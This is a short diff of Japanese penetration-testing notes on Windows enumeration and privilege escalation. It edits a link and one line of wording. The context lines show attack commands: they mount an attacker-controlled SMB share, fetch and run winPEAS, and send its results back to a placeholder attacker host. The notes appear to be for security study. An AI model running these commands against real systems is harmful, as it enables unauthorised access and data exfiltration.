@@ -55,7 +55,6 @@ net use \\<AttackerIP>\share /user:username pw
 cp \\<AttackerIP>\share\winPEASx64.exe .
 .\winPEASx64.exe | Tee-Object -FilePath \\<AttackerIP>\share\peas_result.txt
 ```
-- [[ファイル操作、ユーティリティ#SMB]]
 
 ---
 
@@ -134,7 +133,7 @@ net user <username>
 
 ## 目的
 
-- マシンのOS、バージョン、アーキテクチャを確認して、脆弱性や利用可能な攻撃ツールを特定する
+- マシンのOS、バージョン、アーキテクチャを確認して、利用可能な脆弱性や攻撃ツールを特定する
 
 ## 基本的なシステム情報の列挙コマンド
 
